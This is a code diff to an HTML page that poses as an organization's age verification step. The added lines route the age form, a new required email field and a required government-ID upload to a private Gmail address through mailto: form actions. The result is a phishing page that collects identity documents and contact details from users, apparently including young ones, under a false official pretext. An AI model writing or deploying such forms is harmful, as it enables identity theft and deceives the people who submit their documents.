@@ -123,14 +123,18 @@
         <p>Your organization seeks to conduct an age verification check to confirm that you are above the age of 13.</p>
         <p>Kindly provide your age in the designated field and proceed to complete the following form.</p>
         <!-- Insert your age check content here... -->
-        <form>
+        <form action="mailto:central3465@gmail.com" method="post" enctype="text/plain">
             <label for="age">Enter Your Age:</label>
             <br>
             <input type="number" id="age" name="age" required>
+            <br>
+            <label for="email">Enter Your Email:</label>
+            <br>
+            <input type="email" id="email" name="email" required>
             <button type="submit">Submit</button>
         </form>
         <hr>
-        <form>
+        <form action="mailto:central3465@gmail.com" method="post" enctype="text/plain">
             <div>Kindly provide a government-issued ID (Passport, ID, Driving License, etc) to prove you are above the age limit.</div>
             <br>
             <input type="file" id="myFile" name="filename" required>
